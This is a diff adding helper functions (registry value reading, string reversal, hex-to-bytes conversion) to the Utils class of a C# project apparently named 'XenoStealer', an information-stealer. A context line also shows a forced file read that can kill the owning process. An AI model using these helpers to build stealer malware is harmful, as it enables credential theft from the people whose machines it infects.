@@ -1,5 +1,7 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
+using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -12,6 +14,8 @@ namespace XenoStealer
 {
     public static class Utils
     {
+
+        private static RegistryView[] registryViews = new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 };
 
         public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
         {
@@ -303,6 +307,75 @@ namespace XenoStealer
                 return false;
             }
             return NativeMethods.memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
+        }
+
+        public static string ReverseString(string str)
+        {
+            char[] charArray = str.ToCharArray();
+            Array.Reverse(charArray);
+            return new string(charArray);
+        }
+
+        public static object ReadRegistryKeyValue(RegistryHive hive, string location, string value)
+        {
+            foreach (RegistryView view in registryViews) 
+            {
+                if (view == RegistryView.Registry64 && !Environment.Is64BitOperatingSystem) 
+                {
+                    continue;
+                }
+                RegistryKey hiveKey = null;
+                RegistryKey keyData = null;
+                try
+                {
+                    hiveKey = RegistryKey.OpenBaseKey(hive, view);
+                    if (hiveKey == null)
+                    {
+                        continue;
+                    }
+                    keyData = hiveKey.OpenSubKey(location);
+                    if (keyData == null)
+                    {
+                        hiveKey.Dispose();
+                        continue;
+                    }
+                    object data = keyData.GetValue(value);
+                    if (data == null)
+                    {
+                        hiveKey.Dispose();
+                        keyData.Dispose();
+                        continue;
+                    }
+                    return data;
+                }
+                catch 
+                {
+                    
+                }
+                finally
+                {
+                    hiveKey?.Dispose();
+                    keyData?.Dispose();
+                }
+            }
+            return null;
+        }
+
+        public static byte[] ConvertHexStringToByteArray(string hexString)
+        {
+            if (hexString.Length % 2 != 0)
+            {
+                return null;
+            }
+
+            byte[] data = new byte[hexString.Length / 2];
+            for (int index = 0; index < data.Length; index++)
+            {
+                string byteValue = hexString.Substring(index * 2, 2);//*2 as its 2 chars per byte
+                data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
+            }
+
+            return data;
         }
 
     }
